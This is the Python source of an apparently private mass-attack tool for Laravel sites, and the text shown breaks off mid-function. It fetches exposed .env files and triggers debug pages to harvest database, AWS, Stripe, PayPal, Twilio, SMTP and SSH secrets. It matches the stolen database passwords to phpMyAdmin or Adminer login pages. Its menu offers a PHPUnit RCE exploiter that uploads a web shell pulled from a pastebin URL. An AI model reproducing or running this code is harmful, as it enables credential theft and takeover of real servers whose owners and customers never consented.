#!/usr/bin/env python3
# -*- coding:utf-8 -*-

# main module
import os
import sys
import time
import socket
import random 
import requests
import re
import traceback
import warnings 
import json 
import urllib3
import ipaddress
import numpy
import hashlib
import uuid
import hmac
import base64
import smtplib
import email.utils
import configparser
import subprocess

import twilio.rest
import botocore
import boto3

# Threading module
from concurrent.futures import ThreadPoolExecutor

# cli rich module
from rich.prompt import IntPrompt
from rich.prompt import Prompt
from rich.progress import BarColumn
from rich.progress import Progress
from rich.progress import TimeRemainingColumn
from rich.console import Console
from rich.table import Table
from rich import print

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Threading 
from queue import Queue 
from threading import Thread

# idk why im import this, just need it
from collections import namedtuple as NamedTuple
from datetime import datetime
from ipaddress import ip_address
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
from rich.traceback import install as richTraceback

# For Handling Exception
from requests.exceptions import ConnectTimeout
from requests.exceptions import ReadTimeout
from requests.exceptions import Timeout 
from requests.exceptions import SSLError
from requests.exceptions import ContentDecodingError
from requests.exceptions import ConnectionError
from requests.exceptions import ChunkedEncodingError
from requests.exceptions import HTTPError
from requests.exceptions import ProxyError
from requests.exceptions import URLRequired
from requests.exceptions import TooManyRedirects
from requests.exceptions import MissingSchema
from requests.exceptions import InvalidSchema
from requests.exceptions import InvalidURL
from requests.exceptions import InvalidHeader
from requests.exceptions import InvalidProxyURL
from requests.exceptions import StreamConsumedError
from requests.exceptions import RetryError
from requests.exceptions import UnrewindableBodyError

from socket import timeout as SocketTimeout
from socket import gaierror as SocketHostError
from urllib3.exceptions import ReadTimeoutError
from urllib3.exceptions import DecodeError

# Discord Lib
#from discord_webhook import DiscordWebhook, DiscordEmbed

richTraceback()
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
warnings.simplefilter("ignore", InsecureRequestWarning)

os.system("cls" if os.name == "nt" else "clear")


if not os.path.exists("results"):
    os.mkdir("results")

if not os.path.exists("FuckBot.ini"):
    parser = configparser.ConfigParser()
    parser.add_section("scrapestack")
    parser.set("scrapestack", "scrapestack_key", "put_your_scrapestack_key_here")
    parser.add_section("shell")
    parser.set("shell", "shell_url", "https://pastebin.com/raw/C5zzy6r4")
    parser.set("shell", "shell_name", "idx.php")
    parser.add_section("aws")
    parser.set("aws", "email", "misterxidgoid@gmail.com")
    parser.add_section("email")
    parser.set("email", "your_mail", "misterxidgoid@gmail.com")
    
    with open("FuckBot.ini", "w") as fp:
        parser.write(fp)
    fp.close()


"""
 Author: Ilham Putra H (iDevXploit) <admin_kuli@idevxploit.io>
 Author: Malaikat Bounty (0x0verfl0w) <b4p3r_0verfl0w@idevxploit.io>
 Version: 1.0 Beta (17-01-2021)
 
 Note: Kami Tidak Sepenuhnya Menggunakan Akal Dan Pikiran Kami Saat Membuat Bot Bangsad Ini
"""

class Worker(Thread):
    """ Thread executing tasks from a given tasks queue """
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                # An exception happened in this thread
                print(e)
            finally:
                # Mark this task as done, whether an exception happened or not
                self.tasks.task_done()


class ThreadPool:
    """ Pool of threads consuming tasks from a queue """
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """ Add a task to the queue """
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        """ Add a list of tasks to the queue """
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        """ Wait for completion of all the tasks in the queue """
        self.tasks.join()


class Color:
    GREEN    = lambda x: "[bright_green]" + str(x) + "[/bright_green]"
    RED      = lambda x: "[bright_red]" + str(x) + "[/bright_red]"
    BLUE     = lambda x: "[bright_blue]" + str(x) + "[/bright_blue]"
    YELLOW   = lambda x: "[bright_yellow]" + str(x) + "[/bright_yellow]"
    MAGENTA  = lambda x: "[bright_magenta]" + str(x) + "[/bright_magenta]"
    CYAN     = lambda x: "[bright_cyan]" + str(x) + "[/bright_cyan]"
    WHITE    = lambda x: "[bright_white]" + str(x) + "[/bright_white]"

class FuckBot:

    PATH_ROOT = os.path.dirname(os.path.realpath(__file__))
    PATH_RESULT = os.path.join(PATH_ROOT, "results")

    config = configparser.ConfigParser()
    config.read('FuckBot.ini')

    SCRAPESTACK_KEY = config.get("scrapestack", "scrapestack_key")
    
    SHELL_CODE = config.get("shell", "shell_url")
    SHELL_NAME = config.get("shell", "shell_name")
    
    EMAIL_TEST = config.get("aws", "email")
    
    SMTP_TEST = config.get("email", "your_mail")

    # init Bot
    
        
    def __init__(self):
        
        self.show_info_message("Starting bot!")
        time.sleep(1)
        
        print("\n")
        print(Color.RED("__    __  _______   ________  _______    ______  ________ "))
        print(Color.RED("|  \  /  \|       \ |        \|       \  /      \|        \ "))
        print(Color.RED("| $$ /  $$| $$$$$$$\ \$$$$$$$$| $$$$$$$\|  $$$$$$\\$$$$$$$$"))
        print(Color.RED("| $$/  $$ | $$__| $$    /  $$ | $$__/ $$| $$  | $$  | $$"))
        print(Color.RED("| $$  $$  | $$    $$   /  $$  | $$    $$| $$  | $$  | $$"))
        print(Color.RED("| $$$$$\  | $$$$$$$\  /  $$   | $$$$$$$\| $$  | $$  | $$"))
        print(Color.RED("| $$ \$$\ | $$  | $$ /  $$___ | $$__/ $$| $$__/ $$  | $$"))
        print(Color.RED("| $$  \$$\| $$  | $$|  $$    \| $$    $$ \$$    $$  | $$"))
        print(Color.RED(" \$$   \$$ \$$   \$$ \$$$$$$$$ \$$$$$$$   \$$$$$$    \$$"))
        print("\n")
        

        
        
        list_desc = {
            
            "1": ["IP Address Generator", "[PRIV8]"],
            "2": ["Random IP Address Generator with IP Range", "192.168.0.0-192.168.255.255"],
            "3": ["HTTP IP Address Checker With Port Scanner", "Port 80"],
            "4": ["AWS API Key Generator", "Custom Total"],
            "5": ["Sendgrid API Key Generator", "Custom Total"],
            "6": ["Mass Laravel Validator", "Get Laravel Site List"],
            "7": ["Mass Laravel Database Scanner", "Get PHPMyAdmin or Adminer Login"],
            "8": ["Mass Laravel SMTP Scanner", "Auto Test Send"],
            "9": ["Mass Laravel Config Scanner", "Get Laravel Config"],
            "10": ["Mass Hidden Config Scanner", "Get Missconfigure Config"],
            "11": ["Mass CMS Scanner", "Filter Site List by CMS"],
            "12": ["Mass PHPUnit RCE Exploiter", "Auto Upload Shell"],
            "13": ["Mass Reverse IP Scanner", "With Scrapestack API"],
            "14": ["Mass Reverse IP Scanner", "Unlimited Without Proxy"],
            "15": ["Mass Reverse Domain to IP Address", "Convert Domain to IP Address"],
            "16": ["Mass Subdomain Enumeration Scanner", "Unlimited Without Proxy"],
            "17": ["Mass PayPal Email Validator", "Check Live, Dead, Limited (Beta)"],
            "18": ["Mass Email Validator", "Check Deliverability"],
            "19": ["Mass Twilio Checker", "Format: TWILIO_ACCOUNT_SID|TWILIO_AUTH_TOKEN"],
            "20": ["Mass AWS Checker", "Get Limit, Create Console, Create SMTP, Get Identities"],
            "21": ["Mass AWS EC2 Checker", "Get EC2 VCPU Limit"],
            "22": ["Mass Sendgrid API Key Checker", "Check Limit, Check Used, Check Mail From"],
            "23": ["Exit Program", "Exit Bot"],
            
            }

        self.show_info_message(message="Private bot by, Mohammedkairz\n")
        time.sleep(1)
        self.show_info_message(message="More priv8 tools , telegrams @krztools\n")
        time.sleep(0.5)
        self.show_info_message(message="thanks for using tools.\n")
        time.sleep(2)
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Number")
        table.add_column("List")
        
        for num, desc in list_desc.items():
            table.add_row("[" + Color.GREEN(num) + "]", Color.CYAN(desc[0]) + " " + "[" + Color.RED(desc[1]) + "]")
        print(table)

        print("\n")
        self.choice = self.prompt_ask(command="Enter Your Choice?", choices=[str(i) for i in range(1, len(list(list_desc)) + 1)], integer=True)
        
        if self.choice == len(list(list_desc)):
            
            self.show_info_message(message="Exiting Bot!")
            sys.exit(1)
            
        else:
            
            if self.choice == 1:
                self.input_list = self.prompt_ask(command="How Many IP Address?", integer=True)
                
            elif self.choice == 4:
                self.input_list = self.prompt_ask(command="How Many AWS Key?", integer=True)
                self.input_region = self.prompt_ask(command="AWS Region?", integer=False)
                
            elif self.choice == 5:
                self.input_list = self.prompt_ask(command="How Many Sendgrid Key?", integer=True)
                
            else:
                self.input_list = self.prompt_ask(command="Enter Target List?", integer=False)

            self.num_threads = self.prompt_ask(command="Threads?", integer=True)
            self.clean_file  = self.prompt_ask(command="Clean Result Folder?", choices=["y", "n"], integer=False)

        print("\n")
        self.show_info_message(message="Engine Started!")

        if self.clean_file.strip().lower() == "y":
            self.clean_result_folder()
            
        if self.choice == 1:
            self.ip_address_generator(length=self.input_list)
        elif self.choice == 2:
            self.run_bot(
                bot_mode=self.ip_range_generator,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        
        elif self.choice == 3:
            self.run_bot(
                bot_mode=self.http_port_scanner,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 4:
            self.aws_generator(
                length=self.input_list, 
                region=self.input_region,
            )
        elif self.choice == 5:
            self.sendgrid_generator(length=self.input_list)
        elif self.choice == 6:
            self.run_bot(
                bot_mode=self.laravel_validator,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 7:
            self.run_bot(
                bot_mode=self.get_laravel_database,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 8:
            self.run_bot(
                bot_mode=self.get_laravel_smtp,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 9:
            self.run_bot(
                bot_mode=self.laravel_config_scanner,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 10:
            self.run_bot(
                bot_mode=self.credential_checker,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 11:
            self.run_bot(
                bot_mode=self.cms_scanner,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 12:
            self.run_bot(
                bot_mode=self.phpunit_exploiter,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 13:
            self.run_bot(
                bot_mode=self.reverse_ip_address_viewdns,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 14:
            self.run_bot(
                bot_mode=self.reverse_ip_address_sonar,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 15:
            self.run_bot(
                bot_mode=self.reverse_domain_to_ip,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 16:
            self.run_bot(
                bot_mode=self.subdomain_enumeration_scanner,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 17:
            self.run_bot(
                bot_mode=self.paypal_validator,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 18:
            self.run_bot(
                bot_mode=self.email_validator,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 19:
            self.run_bot(
                bot_mode=self.twilio_checker,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 20:
            self.run_bot(
                bot_mode=self.aws_checker,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
        elif self.choice == 21:
            self.run_bot(
                bot_mode=self.ec_checker,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
            
        elif self.choice == 22:
            self.run_bot(
                bot_mode=self.sendgrid_checker,
                input_list=self.input_list,
                num_threads=self.num_threads,
            )
            

        elif self.choice == len(list(list_desc)) + 1:
            self.show_info_message("Exiting Bot!")
            sys.exit(1)
        else:
            self.show_error_message("Wrong Choice!")
            sys.exit(1)

    # Helper

    def clean_result_folder(self):
        try:
            result_files = [f for f in os.listdir(self.PATH_RESULT) if f.endswith(".txt")]
            for clean in result_files:
                self.show_info_message("Cleaning Result: %s" % clean)
                os.remove(os.path.join(self.PATH_RESULT, clean))
            print("\n")
        except:
            pass

    def prompt_ask(
        self, 
        command = "Command Not Set", 
        choices = False, 
        integer = False
        ):

        if integer:
            if choices:
                retrive_command = IntPrompt.ask("[%s] %s" % (Color.GREEN("?"), Color.CYAN(command)), choices=choices)
            else:
                retrive_command = IntPrompt.ask("[%s] %s" % (Color.GREEN("?"), Color.CYAN(command)))
        else:
            if choices:
                retrive_command = Prompt.ask("[%s] %s" % (Color.GREEN("?"), Color.CYAN(command)), choices=choices)
            else:
                retrive_command = Prompt.ask("[%s] %s" % (Color.GREEN("?"), Color.CYAN(command)))

        return retrive_command

    def clean_string(self, value):
        return value.replace("\n", "").replace("\r", "")
        
    def safe_string(self, value):
        return self.clean_string(value).rstrip().lstrip().strip()

    def map_helper(self, args, kwargs):
        return args(*kwargs)

    def write_file(self, path, value):
        with open(path, "a+") as save:
            save.seek(0, os.SEEK_END)
            if type(value) is list:
                for list_value in value:
                    save.write("%s\n" % list_value)
            elif type(value) is str:
                save.write("%s\n" % value)
        save.close()
        
    def url_format(self, url):
        parse_url = urlparse(url)
        if parse_url.scheme:
            target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
        else:
            target_url = "http://{}".format(url)
        
        return target_url

    
    def set_result(self, filename):
        return os.path.join(self.PATH_RESULT, filename)

    def show_error_message(self, message):
        print("[%s] %s" % (Color.RED("ERROR"), Color.WHITE(message)))
            
    def show_info_message(self, message):
        print("[%s] %s" % (Color.BLUE("INFO"), Color.WHITE(message)))

    def show_warning_message(self, message):
        print("[%s] %s" % (Color.YELLOW("WARNING"), Color.WHITE(message)))

    def show_status_message(self, time, counter, length, data = "Data Empty", message = "Message Not Set", status = False, mode = "Default Mode"):
        
        if status:
            status_message = "[%s] " % Color.GREEN("+")
        else:
            status_message = "[%s] " % Color.RED("-")
        
        status_message += "[%s] " % Color.BLUE(time)
        status_message += "[%s/%s] " % (Color.MAGENTA(counter), Color.MAGENTA(length))
        
        if status:
            if type(message) is list:
                for message_list in message:
                    status_message += "[%s] " % Color.GREEN(message_list)
            else:
                status_message += "[%s] " % Color.GREEN(message)
        else:
            if type(message) is list:
                for message_list in message:
                    status_message += "[%s] " % Color.RED(message_list)
            else:
                status_message += "[%s] " % Color.RED(message)
            
        status_message += "%s " % Color.WHITE(data)
        
        status_message += "[%s - %s]" % (Color.CYAN("./J3mBotMaw0ttz"), Color.YELLOW(mode))
        
        print(self.join_string(status_message))
        

    def set_property(self, dictionary):
        return NamedTuple("setProperty", dictionary.keys())(**dictionary)

    def join_string(self, str_value):
        return "".join([str(item) for item in str_value])

    def get_file(self, file):
        self.show_info_message("Filtering List : %s" % file)
        try:
            join_path   = os.path.join(self.PATH_ROOT, file)
            list_load   = open(join_path).read().splitlines()
            list_data   = list(numpy.unique(list_load))
            list_length = len(list(list_data))
            
            list_init = {"list": list_data, "length": list_length}
            
            return list_init
        except FileNotFoundError:
            self.show_error_message("%s Not Found" % join_path)
            sys.exit(1)

        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass

    # Laravel Grabber

    def get_laravel_config(self, raw, url, debug):

        list_data = {
            "DIGITALOCEAN": {
                "filename": "DO_SPACE.txt",
                "regex": [
                    "DIGITALOCEAN_SPACES_KEY",
                    "DIGITALOCEAN_SPACES_SECRET",
                    "DIGITALOCEAN_SPACES_ENDPOINT",
                    "DIGITALOCEAN_SPACES_REGION",
                    "DIGITALOCEAN_SPACES_BUCKET",
                    "DO_SPACES_KEY",
                    "DO_SPACES_SECRET",
                    "DO_SPACES_ENDPOINT",
                    "DO_SPACES_REGION",
                    "DO_SPACES_BUCKET",
                ],
            },
            "BLOCKCHAIN": {
                "filename": "BLOCKCHAIN_API.txt",
                "regex": ["BLOCKCHAIN_API", "DEFAULT_BTC_FEE", "TRANSACTION_BTC_FEE"],
            },
            "PAYPAL": {
                "filename": "PAYPAL.txt",
                "regex": [
                    "PAYPAL_CLIENT_ID",
                    "PAYPAL_SECRET",
                    "PAYPAL_MODE",
                    "PAYPAL_ENV",
                    "PAYPAL_API_USERNAME",
                    "PAYPAL_API_PASSWORD",
                    "PAYPAL_API_SECRET",
                    "PAYPAL_LIVE_API_USERNAME",
                    "PAYPAL_LIVE_API_PASSWORD",
                    "PAYPAL_LIVE_API_SECRET",
                    "PAYPAL_LIVE_API_CERTIFICATE",
                    "PAYPAL_SANDBOX_API_USERNAME",
                    "PAYPAL_SANDBOX_API_PASSWORD",
                    "PAYPAL_SANDBOX_API_SECRET",
                    "PAYPAL_SANDBOX_API_CERTIFICATE",
                ],
            },
            "DATABASE": {
                "filename": "DATABASE.txt",
                "regex": [
                    "DB_HOST",
                    "DB_PORT",
                    "DB_DATABASE",
                    "DB_USERNAME",
                    "DB_PASSWORD",
                ],
            },
            "INDIPAY": {
                "filename": "INDIPAY.txt",
                "regex": [
                    "INDIPAY_MERCHANT_ID",
                    "INDIPAY_ACCESS_CODE",
                    "INDIPAY_WORKING_KEY",
                ],
            },
            "AWS": {
                "filename": "AWS.txt",
                "regex": [
                    "AWS_ACCESS_KEY_ID",
                    "AWS_SECRET_ACCESS_KEY",
                    "AWS_DEFAULT_REGION",
                    "AWS_KEY",
                    "AWS_SECRET",
                    "AWS_REGION",
                    "AWS_BUCKET",
                    "AWS_SNS_KEY",
                    "AWS_SNS_SECRET",
                    "SMS_FROM",
                    "SMS_DRIVER",
                    "AWS_SNS_REGION",
                    "AWS_S3_KEY",
                    "AWS_S3_SECRET",
                    "AWS_S3_REGION",
                    "AWS_SES_KEY",
                    "AWS_SES_SECRET",
                    "AWS_SES_REGION",
                    "SES_KEY",
                    "SES_SECRET",
                    "SES_REGION",
                ],
            },
            "STRIPE": {
                "filename": "STRIPE.txt",
                "regex": [
                    "STRIPE_PUBLISHABLE_KEY",
                    "STRIPE_SECRET_KEY",
                    "STRIPE_WEBHOOK_SECRET",
                    "STRIPE_ACCOUNT_COUNTRY",
                ],
            },
            "TWILIO": {
                "filename": "TWILIO.txt",
                "regex": [
                    "TWILIO_ACCOUNT_SID",
                    "TWILIO_API_KEY",
                    "TWILIO_API_SECRET",
                    "TWILIO_CHAT_SERVICE_SID",
                    "TWILIO_NUMBER",
                    "TWILIO_AUTH_TOKEN",
                    "TWILIO_SID",
                    "TWILIO_TOKEN",
                    "TWILIO_FROM",
                ],
            },
            "NEXMO": {
                "filename": "NEXMO.txt",
                "regex": ["NEXMO_KEY", "NEXMO_SECRET", "NEXMO_NUMBER"],
            },
            "EXOTEL": {
                "filename": "EXOTEL.txt",
                "regex": ["EXOTEL_API_KEY", "EXOTEL_API_TOKEN", "EXOTEL_API_SID"],
            },
            "ONESIGNAL": {
                "filename": "ONESIGNAL.txt",
                "regex": [
                    "ONESIGNAL_APP_ID",
                    "ONESIGNAL_REST_API_KEY",
                    "ONESIGNAL_USER_AUTH_KEY",
                ],
            },
            "TOKBOX": {
                "filename": "TOKBOX.txt",
                "regex": [
                    "TOKBOX_KEY_DEV",
                    "TOKBOX_SECRET_DEV",
                    "TOKBOX_KEY",
                    "TOKBOX_SECRET",
                    "TOKBOX_KEY_OLD",
                    "TOKBOX_KEY_OLD",
                    "TOKBOX_SECRET_OLD",
                ],
            },
            "PLIVO": {
                "filename": "PLIVO.txt",
                "regex": ["PLIVO_AUTH_ID", "PLIVO_AUTH_TOKEN"],
            },
            "SMTP": {
                "filename": "SMTP.txt",
                "regex": [
                    "MAIL_HOST",
                    "MAIL_PORT",
                    "MAIL_ENCRYPTION",
                    "MAIL_USERNAME",
                    "MAIL_PASSWORD",
                    "MAIL_FROM_ADDRESS",
                    "MAIL_FROM_NAME",
                ],
            },
            "PERFECTMONEY": {
                "filename": "PERFECTMONEY.txt",
                "regex": [
                    "PM_ACCOUNTID",
                    "PM_PASSPHRASE",
                    "PM_CURRENT_ACCOUNT",
                    "PM_MARCHANTID",
                    "PM_MARCHANT_NAME",
                    "PM_UNITS",
                    "PM_ALT_PASSPHRASE",
                ],
            },
            "RAZORPAY": {
                "filename": "RAZORPAY.txt",
                "regex": ["RAZORPAY_KEY", "RAZORPAY_SECRET"],
            },
            "SSH": {
                "filename": "SSH.txt",
                "regex": ["SSH_HOST", "SSH_USERNAME", "SSH_PASSWORD"],
            },
        }

        if raw:

            stored_key = []
            for list_key in list_data:

                stored_value = []
                index = 0

                for regex_value in reversed(list_data[list_key]["regex"]):

                    if debug:
                        get_config = re.findall("<td>%s<\/td>\s+<td><pre.*>(.*?)<\/span>" % regex_value, raw)
                    else:
                        get_config = re.findall(regex_value + "(.+?)\n", raw)

                    if get_config and regex_value[0]:

                        if debug:
                            stored_value.append(list_data[list_key]["regex"][::-1][index] + "=" + get_config[0])
                        else:
                            stored_value.append(list_data[list_key]["regex"][::-1][index] + get_config[0])

                        set_key = list_data[list_key]["filename"].replace(".txt", "")

                        if set_key not in stored_key:
                            
                            stored_key.append(set_key)

                    index = index + 1  # iterkey

                if stored_value:

                    stored_value.append("URL=%s" % url)
                    
                    if debug:
                        stored_value.append("METHOD=debug")
                    else:
                        stored_value.append("METHOD=/.env")

                    set_laravel_result = self.set_result(list_data[list_key]["filename"])
                        
                    self.write_file(set_laravel_result, "\n".join(stored_value[::-1]) + "\n")
            
            if stored_key:
                
                set_type = set(stored_key)
            else:
                set_type = False

            return set_type
    
    def laravel_validator(self, counter, length, url):
        try:
            
            live_list = self.set_result("laravel_site_live.txt")
            dead_list = self.set_result("laravel_site_dead.txt")
            
            parse_url = urlparse(url)

            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(url)
                
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }
            
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            try:
                
                url_config = "/".join([target_url, ".env"])

                get_config = requests.get(
                    url=url_config,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=False,
                )
                
                if "APP_KEY" in get_config.text:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Laravel",
                        status=True,
                        mode="Laravel Validator",
                    )
                    self.write_file(live_list, target_url)
                else:
                    get_config = requests.post(
                        url=target_url,
                        data={"0x[]": "x_X"},
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                    )
                    if "<td>APP_KEY</td>" in get_config.text:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message="Laravel Debug",
                            status=True,
                            mode="Laravel Validator",
                        )
                        self.write_file(live_list, target_url)
                        
                    else:
                        
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message="Not Laravel",
                            status=False,
                            mode="Laravel Validator",
                        )
                        self.write_file(dead_list, target_url)
                
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Can't Connect or Timeout!",
                    status=False,
                    mode="Laravel Validator"
                )
                
            
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            
    def get_laravel_database(self, counter, length, url):
        try:
            
            db_config_live = self.set_result(filename="laravel_database_live.txt")
            db_config_dead = self.set_result(filename="laravel_database_dead.txt")
            
            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://".format(url)
            
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }

            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            try:
                url_config = "/".join([target_url, ".env"])

                get_config = requests.get(
                    url=url_config,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=False,
                )

                if "APP_KEY" in get_config.text:
                    config_value = get_config.text
                    
                    #gggggg
                    
                    try:
                        db_host = re.findall("DB_HOST=(.*)", config_value)[0]
                    except:
                        db_host = "-"
                    try:
                        db_port = re.findall("DB_PORT=(.*)", config_value)[0]
                    except:
                        db_port = "-"
                    try:
                        db_database = re.findall("DB_DATABASE=(.*)", config_value)[0]
                    except:
                        db_database = "-"
                    try:
                        db_user = re.findall("DB_USERNAME=(.*)", config_value)[0]
                    except:
                        db_user = "-"
                    try:
                        db_pass = re.findall("DB_PASSWORD=(.*)", config_value)[0]
                    except:
                        db_pass = "-"
                    
                else:
                    get_config = requests.post(
                        url=target_url,
                        data={"0x[]": "x_X"},
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                    )

                    if "<td>APP_KEY</td>" in get_config.text:
                        config_value = get_config.text
                        try:
                            db_host      = re.findall("<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_host = "-"
                        try:
                            db_port      = re.findall("<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_port = "-"
                        try:
                            db_database  = re.findall("<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_database = "-"
                        try:
                            db_user      = re.findall("<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_user = "-"
                        try:
                            db_pass      = re.findall("<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_pass = "-"
                        #except:
                            #config_value = False
                    else:
                        config_value = False
                        
                if config_value:
                    db_manager = ['/adminer.php','/Adminer.php','/phpmyadmin']
                    for db_path in db_manager:
                        get_db = requests.get(url="".join([target_url, db_path]), timeout=5, verify=False)
                        db_raw = get_db.text
                        
                        if "phpmyadmin.net" in db_raw:
                            db_url = "".join([target_url, db_path])
                            
                            build_db  = "# Login URL: %s\n" % db_url
                            build_db += "# Database Host: %s\n" % db_host
                            build_db += "# Database Port: %s\n" % db_port
                            build_db += "# Database Name: %s\n" % db_database
                            build_db += "# Database Username: %s\n" % db_user
                            build_db += "# Database Password: %s\n\n" % db_pass
                            append_db = self.join_string(build_db)
                            
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Found PHPMyAdmin Config",
                                status=True,
                                mode="Laravel Database Scanner",
                            )
                            
                            self.write_file(db_config_live, append_db)
                            
                        elif "Login - Adminer" in db_raw:
                            db_url = "".join([target_url, db_path])
                            
                            build_db  = "# Login URL: %s\n" % db_url
                            build_db += "# Database Host: %s\n" % db_host
                            build_db += "# Database Port: %s\n" % db_port
                            build_db += "# Database Name: %s\n" % db_database
                            build_db += "# Database Username: %s\n" % db_user
                            build_db += "# Database Password: %s\n\n" % db_pass
                            append_db = self.join_string(build_db)
                            
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Found Adminer Config",
                                status=True,
                                mode="Laravel Database Scanner",
                            )
                            
                            self.write_file(db_config_live, append_db)
                            
                        else:
                            build_db  = "# URL: %s\n" % target_url
                            build_db += "# Database Host: %s\n" % db_host
                            build_db += "# Database Port: %s\n" % db_port
                            build_db += "# Database Name: %s\n" % db_database
                            build_db += "# Database Username: %s\n" % db_user
                            build_db += "# Database Password: %s\n\n" % db_pass
                            append_db = self.join_string(build_db)
                            
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message=["Database Path Not Found", "Database Config Found"],
                                status=True,
                                mode="Laravel Database Scanner",
                            )
                            
                            self.write_file(db_config_dead, append_db)
                else:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Config Not Found",
                        status=False,
                        mode="Laravel Database Scanner",
                    )
                
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Can't Connect or Timeout!",
                    status=False,
                    mode="Laravel Config Scanner"
                )
                
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            
    def get_laravel_smtp(self, counter, length, url):
        try:
            
